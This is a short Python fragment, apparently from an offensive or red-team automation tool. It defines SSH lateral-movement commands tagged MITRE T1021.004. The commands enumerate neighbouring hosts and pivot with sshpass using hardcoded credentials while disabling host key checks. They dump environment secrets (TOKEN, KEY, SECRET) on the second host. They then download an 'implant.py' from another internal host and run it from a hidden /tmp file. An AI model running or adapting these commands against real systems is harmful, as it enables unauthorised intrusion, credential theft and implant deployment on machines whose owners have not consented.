"""
SSH Lateral Movement (T1021.004)

Password-based SSH pivot to secondary host using sshpass.
Credentials: samba / password123
"""

SSH_LATERAL_COMMANDS = [
    "echo '=== SSH LATERAL ==='",
    # Enumerate reachable hosts from known_hosts + ARP
    "cat ~/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | sed 's/|.*//'",
    "arp -n 2>/dev/null | grep -v incomplete",
    # Verify sshpass available, install if not
    "which sshpass 2>/dev/null || (apt-get install -y sshpass 2>/dev/null || true)",
    # Pivot to secondary victim with password auth
    "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
    "samba@10.4.60.41 'hostname; whoami; id; env | grep -iE TOKEN|KEY|SECRET' 2>/dev/null",
    # Drop implant on secondary via password SSH
    "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
    "samba@10.4.60.41 'curl -s http://10.4.60.21:8080/implant.py -o /tmp/.cache_ds2.py && python3 /tmp/.cache_ds2.py &' 2>/dev/null",
]
